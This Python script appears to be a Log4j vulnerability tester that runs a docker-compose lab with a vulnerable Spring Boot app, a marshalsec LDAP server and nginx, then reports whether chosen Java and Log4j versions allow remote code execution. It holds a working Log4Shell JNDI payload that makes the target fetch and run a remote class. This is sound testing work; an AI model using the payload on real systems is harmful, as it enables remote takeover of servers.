import argparse
import logging
import re
import os
import sys
import urllib.parse

from subprocess import Popen, PIPE

from colored_formatted import ColoredFormatter

DEBUG = "DEBUG"
INFO = "INFO"
WARNING = "WARNING"
ERROR = "ERROR"

MARSHAL_SEC_UP_PATTERN = "^.*Listening on 0.0.0.0:1389.*$"
MARSHAL_SEC_UP_MESSAGE = "Marshalsec is up and running"

SPRING_BOOT_UP_PATTERN = "^.*:: Spring Boot ::.*$"
SPRING_BOOT_UP_MESSAGE = "Vulnerable spring boot is up and running "

PAYLOAD_SENT_PATTERN = ".*Sending payload.*"
PAYLOAD_SENT_MESSAGE = "The payload was sent using curl"

HTTP_SERVER_UP_PATTERN = ".*1#1: nginx/.*"
HTTP_SERVER_UP_MESSAGE = "Nginx server is up and running"

MARSHAL_SEC_CALLED_PATTERN = ".*Send LDAP reference result for Log4jRCE redirecting to.*"
MARSHAL_SEC_CALLED_MESSAGE = "The LDAP call was made by the JNDI payload"

HTTP_CALLED_PATTERN = ".*GET /Log4jRCE.class HTTP/1.*"
HTTP_CALLED_MESSAGE = "Exploit is being dowloaded from the Nginx server"


DEFAULT_PAYLOAD = "${jndi:ldap://marshalsec:1389/Log4jRCE}"
LOG_PATTERNS = [
    [MARSHAL_SEC_UP_PATTERN, MARSHAL_SEC_UP_MESSAGE, logging.INFO],
    [SPRING_BOOT_UP_PATTERN, SPRING_BOOT_UP_MESSAGE, logging.INFO],
    [PAYLOAD_SENT_PATTERN, PAYLOAD_SENT_MESSAGE, logging.INFO],
    [HTTP_CALLED_PATTERN, HTTP_CALLED_MESSAGE, logging.WARNING],
    [MARSHAL_SEC_CALLED_PATTERN, MARSHAL_SEC_CALLED_MESSAGE, logging.WARNING],
]

logging.root.setLevel(logging.NOTSET)
logger = logging.getLogger(__file__)
ch = logging.StreamHandler()
ch.setLevel(logging.DEBUG)

ch.setFormatter(ColoredFormatter())

logger.addHandler(ch)


def delete_containers():
    logger.info("Shutting down the docker containers")
    docker_compose_down_process = Popen(["docker-compose", "down"], stdout=PIPE, stderr=PIPE)
    docker_compose_down_process.communicate()
    logger.info("Containers shut down successfully")


def analyze_log_line(log_line):
    print(log_line)
    for logpattern in LOG_PATTERNS:
        pattern_regex, pattern_message, log_level = logpattern
        if re.match(pattern_regex, log_line):
            logger.log(log_level, pattern_message)
            continue

    if "Remote Code Execution gained!!!" in log_line:
        logger.error("[[[ This version of the application is vulnerable !!!! ]]]")
        delete_containers()
        exit(1)
    if "has to be an integer." in log_line:
        logger.info("[[[ This version of the application is not vulnerable ]]]")
        delete_containers()
        exit(0)


def main():
    parser = argparse.ArgumentParser(description="log4j-vulnerability-tester")
    parser.add_argument("--java-version", type=str, dest="java_version", required=True,
                        help="version of java to be used")
    parser.add_argument("--log4j-version", type=str, dest="log4j_version", required=True,
                        help="version of log4j to be used")
    parser.add_argument("--payload", type=str, default=urllib.parse.quote_plus(DEFAULT_PAYLOAD),
                        nargs="?", help="version of java to be used")    

    args = parser.parse_args()

    java_version = args.java_version
    log4j_version = args.log4j_version

    os.environ["JAVA_VERSION"] = java_version
    os.environ["LOG4J_VERSION"] = log4j_version
    os.environ["PAYLOAD"] = args.payload

    logger.info(f"Populating the docker-compose.yaml file for Java version: '{java_version}' and Log4J version: '{log4j_version}' with the payload '{DEFAULT_PAYLOAD}'")
    
    logger.info("Starting up the docker environment.")
    docker_compose_up_process = Popen(["docker-compose", "up"], stdout=PIPE, stderr=PIPE, env=os.environ)
    try:
        while True:
            for line in iter(docker_compose_up_process.stdout.readline,''):
                decoded_line = line.rstrip().decode('utf-8')
                analyze_log_line(decoded_line)
    except KeyboardInterrupt:
        answer_in_range = False
        while not answer_in_range:
            answer = input("Would you like to shutdown and delete the containers before exiting? [n/y]")
            if answer == "y":
                delete_containers()
                exit(0)
            elif answer == "n":
                exit(0)


if __name__ == "__main__":
    main()
